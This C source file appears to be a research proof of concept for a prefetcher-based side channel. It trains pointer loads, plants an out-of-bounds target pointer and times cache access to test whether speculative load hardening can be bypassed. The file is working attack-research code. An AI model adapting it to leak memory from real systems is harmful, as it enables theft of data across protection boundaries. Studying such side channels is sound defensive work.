#include "../util/util.h"
#include "../bunnyhop/bunnyhop.h"
#include <sys/mman.h>

#define TRAIN asm volatile("" ::: "cc"); \
__trash += *(uint64_t *)training_aop[i]; \
asm volatile("" ::: "cc"); \
__trash &= MSB_MASK;
#define PAD_NOP "nop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\nadd $1, %0\n"
#define PAD asm volatile(PAD_NOP : "=r" (i) : "0" (i) : "cc");


/* 
    While this is straightline code to avoid the SLH. there is also an optmization
    where a dependent load won't get SLH'd so we could do something like this instead
    will_be_slhd = load ...
    ptr = load will_be_slhd  <==== Already protected so won't be protected again
    ... = load ptr 
*/
int main(int argc, char **argv) {
    if(argc != 2) {
        printf("Usage: ./slh_all.out <out of bounds read idx>\n");
        exit(1);
    }

    // params
    uint64_t training_aop_size = 256;
    uint64_t core_id = 7; 
    uint64_t repititions = 10; 
    uint64_t out_of_bounds_idx = atoi(argv[1]); 

    // output
    printf("SLH PoC!\n");
    printf("Training Size: \t\t%llu\n", training_aop_size);
    printf("Core id: \t\t%llu\n", core_id);
    printf("Reps: \t\t\t%llu\n", repititions);
    printf("OoB Idx: \t\t%llu\n", out_of_bounds_idx);

    // pin to pcore 
    pin_cpu(core_id); 

    // Generate training aop + ptr_under_test
    srand(12);
    uint64_t *ptr_under_test = NULL; 
    volatile uint64_t *training_aop = malloc(sizeof(uint64_t*) * (training_aop_size + out_of_bounds_idx + 1));
    volatile uint64_t *training_buffer = malloc(sizeof(uint64_t) * DATA_BUFFER_MASK * U64S_PER_CACHE_LINE); 
    for(int i = 0; i < DATA_BUFFER_MASK * U64S_PER_CACHE_LINE; i+=U64S_PER_CACHE_LINE) training_buffer[i] = rand() & (MSB_MASK - 1); 
    for(int i = 0; i < training_aop_size; i++) {
        uint64_t idx = (rand() % DATA_BUFFER_MASK) * U64S_PER_CACHE_LINE; 
        training_aop[i] = (uint64_t)&training_buffer[idx]; 
    }
    ptr_under_test = &training_buffer[(rand() % DATA_BUFFER_MASK) * U64S_PER_CACHE_LINE];

    // trash
    uint64_t __trash = 0; 

    // thrash ddp state 
    sleep(0); 

    /* BASE MODE */
    uint64_t mode = 0; 
    uint64_t base_mode = 0; 

    // begin loop  
    uint64_t base[repititions], atck[repititions];
    for(int k = 0; k < repititions * 2; k++) {
        // idx 
        int i = 0;  

        // setup target pointer
        training_aop[training_aop_size + out_of_bounds_idx] = ((uint64_t)ptr_under_test & mode);

        _mm_mfence(); 
        _mm_lfence();

        // flush DDP + ptr_under_test
        __trash = clflush(ptr_under_test, __trash);
        sleep(0);

        _mm_mfence(); 

        // training 
        asm volatile("nop\nnop\nnop\n");
        TRAIN // this first load is useless ... not aligned properly 
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        TRAIN
        PAD
        
        _mm_mfence(); 
        _mm_lfence();

        // sleep 
        __trash = c_sleep(1500, __trash);

        // measure 
        uint64_t test_time = time_access(ptr_under_test, __trash);
        __trash = (__trash | test_time) & MSB_MASK;

        // save
        if(mode == base_mode)
            base[k/2] = test_time; 
        else 
            atck[k/2] = test_time;

        mode = ~mode;
    }

    // output 
    qsort( atck, repititions, sizeof(uint64_t), compare );  
    // qsort( base, repititions, sizeof(uint64_t), compare );  
    printf("Base: ");
    for(int i = 0; i < repititions; i++) printf("%lu ", base[i]);
    printf("\n");
    printf("Atck: ");
    for(int i = 0; i < repititions; i++) printf("%lu ", atck[i]);
    printf("\n");
}
